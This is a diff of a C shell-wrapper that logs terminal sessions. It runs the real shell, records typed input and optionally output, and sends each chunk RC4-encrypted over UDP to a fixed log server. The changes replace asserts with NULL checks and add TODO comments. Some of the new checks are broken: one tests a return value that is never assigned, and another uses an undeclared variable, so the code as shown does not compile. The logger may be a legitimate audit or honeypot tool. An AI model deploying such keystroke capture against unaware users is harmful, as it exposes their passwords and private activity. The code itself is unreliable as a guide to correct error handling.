@@ -46,17 +46,28 @@ static int setup_terminal(int tty, struct termios *tm) {
     struct termios tbttr;
     int ret = 0;
 
-    assert(tm != NULL);
+    /* assert is replaced to ensure correct pointer always */
+    if (NULL == tm) {
+	client_err("struct termios tm is NULL at setup\n");
+	return -1;
+    }
 
     ret = tcgetattr(0, tm);
-    if (ret) {
-	client_err("Failed to get terminal attributes: %d\n", errno);
+    if (-1 == ret) {
+	client_err("Failed to get terminal attributes at setup: %d\n", errno);
 	return -1;
     }
 
     memcpy(&tbttr, tm, sizeof (tbttr));
 
-    tcsetattr(tty, TCSANOW, tm);
+    /* TODO this function returns success in case at least one attr success,
+     * so we should check for full attributes equality
+     */
+    ret = tcsetattr(tty, TCSANOW, tm);
+    if (-1 == ret) {
+	client_err("Failed to set tm terminal attributes at setup: %d\n", errno);
+	return -1;
+    }
 
     tbttr.c_iflag |= IGNPAR; /* Ignore framing errors and parity errors. */
     tbttr.c_iflag &= ~(ISTRIP | INLCR | IGNCR | ICRNL | IXON | IXANY | IXOFF);
@@ -66,28 +77,52 @@ static int setup_terminal(int tty, struct termios *tm) {
     tbttr.c_cc[VMIN] = 1;
     tbttr.c_cc[VTIME] = 0;
 
+    /* TODO this function returns success in case at least one attr success,
+     * so we should check for full attributes equality
+     */
     tcsetattr(0, TCSANOW, &tbttr);
+    if (-1 == ret) {
+	client_err("Failed to set tbttr terminal attributes at setup: %d\n", errno);
+	return -1;
+    }
 
     return 0;
 }
 
 static void reset_terminal(struct termios *tm) {
-    assert(tm != NULL);
+    /* assert is replaced to ensure correct pointer always */
+    if (NULL == tm) {
+	client_err("struct termios tm is NULL at reset\n");
+        return;
+    }
     tcsetattr(0, TCSANOW, tm);
+    if (-1 == ret) {
+	client_err("Failed to set tm terminal attributes during reset: %d\n", errno);
+    }
 }
 
 static int create_server_connection(Connection_Data_t *cd) {
 
-    assert(cd != NULL);
+    int ret = 0;
+    /* assert is replaced to ensure correct pointer always */
+    if (NULL == cd) {
+	client_err("Connection_Data cd is NULL at create server connection\n");
+        return -1;
+    }
 
-    if ((cd->server_fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) < 0) {
+    if (0 > (cd->server_fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP))) {
 	client_err("Failed to open socket: %d\n", errno);
 	return -1;
     }
 
     cd->server_addr.sin_family = AF_INET;
     cd->server_addr.sin_port = htons(SHELL_LOG_SERVER_PORT);
-    inet_aton(CONNECT_IP, &cd->server_addr.sin_addr);
+    ret = inet_aton(CONNECT_IP, &cd->server_addr.sin_addr);
+    if (0 == ret) {
+	/* TODO provide invalid address as string to error output */
+	client_err("invalid address supplied to inet_aton\n");
+	return -1;
+    }
     cd->nb_pkt_sent = 0;
 
     return 0;
@@ -100,24 +135,33 @@ static int create_real_shell_run_cmd(char *argv[],
     char *last_slash = NULL;
     int n = strlen(REAL_SHELL_DIR);
 
-    assert(cmd_str != NULL);
-    assert(argv != NULL);
+    /* asserts are replaced to ensure correct pointer always */
+    if (NULL == cmd_str) {
+	client_err("cmd_str is NULL at create real shell run cmd\n");
+        return -1;
+    }
+    if (NULL == argv) {
+	client_err("argv is NULL at create real shell run cmd\n");
+        return -1;
+    }
 
     if ((last_slash = strrchr(argv[0], '/')) == NULL) {
 	last_slash = argv[0];
     } else {
+	/* TODO i dont understand this one... null pointer++?? */
 	last_slash++;
     }
 
     client_dbg("CMD: %s\n", last_slash);
 
-    if (n > cmd_str_max_length - cmd_str_index)
+    if (n > (cmd_str_max_length - cmd_str_index))
 	goto not_enough_buffer_length;
 
     memcpy(&cmd_str[cmd_str_index], REAL_SHELL_DIR, n);
     cmd_str_index += n;
 
     if (cmd_str[cmd_str_index - 1] != '/') {
+	/* TODO this is possible error due to +1 after dereference */
 	cmd_str[cmd_str_index++] = '/';
     }
 
@@ -132,6 +176,7 @@ static int create_real_shell_run_cmd(char *argv[],
     n = 1;
     if (n > cmd_str_max_length - cmd_str_index)
 	goto not_enough_buffer_length;
+    /* TODO this is possible error due to +1 after dereference */
     cmd_str[cmd_str_index++] = '\0';
 
     return 0;
@@ -149,10 +194,19 @@ static int encrypt_and_send(Connection_Data_t *cd, Session_Data_t * sd) {
     unsigned char msg[MAX_TRANSFER_PKT_SZ];
     int rc4_offset = 0;
     int msg_index = 0;
+    int res = 0;
 
-    assert(cd != NULL);
-    assert(sd != NULL);
+    /* asserts are replaced to ensure correct pointer always */
+    if (NULL == cd) {
+	client_err("cd is NULL at encrypt and send\n");
+        return -1;
+    }
+    if (NULL == sd) {
+	client_err("sd is NULL at encrypt and send\n");
+        return -1;
+    }
 
+    /* TODO time could return error and set errno, possible refactor */
     srand(time(NULL));
 
     /* setup a new RC4 IV */
@@ -187,9 +241,13 @@ static int encrypt_and_send(Connection_Data_t *cd, Session_Data_t * sd) {
     sha1_update(&sha1, &msg[RC4_SZ], msg_index);
     sha1_finish(&sha1, &msg[RC4_SZ + msg_index]);
 
-    sendto(cd->server_fd, msg, RC4_SZ + msg_index + SHA1_SZ, 0,
+    res = sendto(cd->server_fd, msg, RC4_SZ + msg_index + SHA1_SZ, 0,
 	    (struct sockaddr *) &cd->server_addr,
 	    sizeof ( cd->server_addr));
+    if (-1 == res) {
+	client_err("Failed to send message to server: %d\n", errno);
+	return -1;
+    }
 
 #ifdef DEBUG
     unsigned char sha1sum[SHA1_SZ];
@@ -295,7 +353,7 @@ int main(int argc, char *argv[]) {
     }
 
     /* handle child exit */
-
+    /* TODO there was an explaining about children and signals... */
     signal(SIGCHLD, sighandler);
 
     /* fork to exec the original shell */
@@ -317,17 +375,17 @@ int main(int argc, char *argv[]) {
 
 	    close(cd.server_fd);
 
+	    /* TODO why do we need this sleep? */
 	    usleep(50000);
 	    execv(real_shell, argv);
+		/* TODO this one may fail */
 	    tcsetattr(0, TCSANOW, &tm);
 	    exit(1);
-
 
 	    break;
 	default:
 
 	    /* Parent : shell logger */
-
 
 	    sd.uid = getuid();
 
@@ -347,6 +405,7 @@ int main(int argc, char *argv[]) {
 
 		if (FD_ISSET(0, &rd)) {
 
+		    /* TODO this one may fail */
 		    gettimeofday(&tv, NULL);
 		    sd.time = tv.tv_sec;
 
@@ -361,6 +420,7 @@ int main(int argc, char *argv[]) {
 
 		    sd.dir = INPUT_DIR;
 		    sd.len = n;
+		    /* TODO this one may fail */
 		    encrypt_and_send(&cd, &sd);
 
 		    if ((n = write(pty, sd.buffer, n)) != n) {
@@ -373,6 +433,7 @@ int main(int argc, char *argv[]) {
 
 		if (FD_ISSET(pty, &rd)) {
 
+			/* TODO this one may fail */
 		    gettimeofday(&tv, NULL);
 		    sd.time = tv.tv_sec;
 
@@ -388,6 +449,7 @@ int main(int argc, char *argv[]) {
 #if LOG_OUTPUT 
 		    sd.dir = OUTPUT_DIR;
 		    sd.len = n;
+		    /* TODO this one may fail */
 		    encrypt_and_send(&cd, &sd);
 #endif
 		    if ((n = write(1, sd.buffer, n)) != n) {
